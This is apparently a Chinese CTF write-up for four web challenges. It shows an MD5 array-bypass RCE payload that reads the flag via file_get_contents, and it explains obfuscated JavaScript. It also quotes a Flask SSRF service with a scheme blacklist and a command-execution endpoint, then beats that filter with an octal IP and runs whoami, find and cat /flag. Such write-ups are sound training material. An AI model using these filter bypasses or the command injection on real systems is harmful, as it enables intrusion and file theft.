## Lemon
`ctrl+shift+i`打开控制台，元素最底下是flag
## RCE1
根据代码可知,rce1和rce2的Md5哈希值要相同并且rce1和rce2不同,因为是强类型比较,所以可以用数组绕过，例如`?rce1[]=a rce2[]=b`因为数组无法解析为md5,所以会返回null,null=null就成立了，并且a!=b,又因为他还进行了一些过滤，数字`\$%&#@*`和许多命令，先发送get`?rce1[]=a`post`rce2[]=b&rce3=print_r(scandir('/'));`查找目录找到flag关键词，在发送post`rce2[]=b&rce3=print_r(file_get_contents('/'.'fla'.'g'));`因为flag被过滤，所以要将flag隔开。
## 你好，爪洼脚本
打开题目，出现一堆由`ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ ...`组成的乱码，并非无意义的乱码，而是**用特殊符号伪装的合法脚本语法**（大概率是 JavaScript，因为浏览器控制台默认执行 JS）。 之所以看起来乱，是为了隐藏逻辑，防止直接被肉眼识别，但浏览器 / 控制台的脚本引擎能正常解析特殊字符（JS 允许 UTF-8 特殊字符作为变量名）。- 当你把混淆代码复制到控制台并回车时，控制台会把这段文本当作 JS 代码，交给 JS 引擎逐行解析执行。
## DNS想要玩
网页显示了一堆代码
```python
from flask import Flask, request # Flask 框架核心，处理请求 
from urllib.parse import urlparse # 解析 URL 结构（提取主机名等） 
import socket # 网络操作，用于解析主机名到 IP（DNS 解析） 
import os # 系统操作，用于执行系统命令（os.popen）
app = Flask(__name__) # 初始化 Flask 应用 
# SSRF 防护的黑名单：禁止包含这些字符串的 
URL BlackList = [ 'localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4' ]
def check(url): 
url = urlparse(url) 
# 解析 URL，提取 hostname（主机名）、scheme（协议）等 
host = url.hostname # 获取 URL 中的主机名（如 URL 是 http://example.com/path，host 是 example.com） 
host_acscii = host.encode('idna').decode('utf-8') # 处理国际化域名（IDN），转成 ASCII 格式 
# 验证：将主机名解析为 IP，判断是否等于 114.5.1.4 
return socket.gethostbyname(host_acscii) == '114.5.1.4'
#ssrf接口（核心功能）
@app.route('/ssrf') 
def ssrf(): 
raw_url = request.args.get('url') # 从 GET 参数获取 url（如 ?url=http://xxx） 
if not raw_url: return 'URL Needed' # 未传 url 参数，返回提示 
# 黑名单过滤：检查 url 中是否包含黑名单字符串 
for u in BlackList: if u in raw_url: return 'Invaild URL' # 包含黑名单字符，拒绝请求 # 调用 check 函数验证 URL：主机名解析后是否为 114.5.1.4 
if check(raw_url): # 验证通过，执行 cmd 参数指定的系统命令，并返回结果 return 
os.popen(request.args.get('cmd')).read() else: 
return "NONONO" # 验证失败，拒绝执行命令
```
- **`/` 接口**：返回当前脚本的源代码（`open(__file__).read()`），方便攻击者查看代码逻辑（CTF 中常见的 “源码泄露” 设计）。
- 在 URL 后面加 `ssrf`（即路径 `/ssrf`），本质是因为 **Flask 应用通过「路由匹配」来区分不同的功能接口**——`/ssrf` 是代码中明确定义的 “处理 SSRF 逻辑 + 命令执行” 的接口路径，只有访问这个路径，才能触发后续的 `url` 验证和 `cmd` 命令执行功能。
因为114.5.1.4被黑名单过滤了，所以可以将114.5.1.4转换成八进制或十进制，实测十进制不行，八进制可以，将114   5   1  4分别转换成八进制，进而执行后面的cmd指令,所以访问`/ssrf?url=http://0162.05.01.04&cmd=whoami`返回root,所以可以执行指令，cmd部分改成`&cmd=ls`返回app.py是网页的python没用，可以用`&cmd=find / -name "*flag"`全局搜索flag文件，找到一个/flag文件，用`&cmd=cat /flag`得到flag
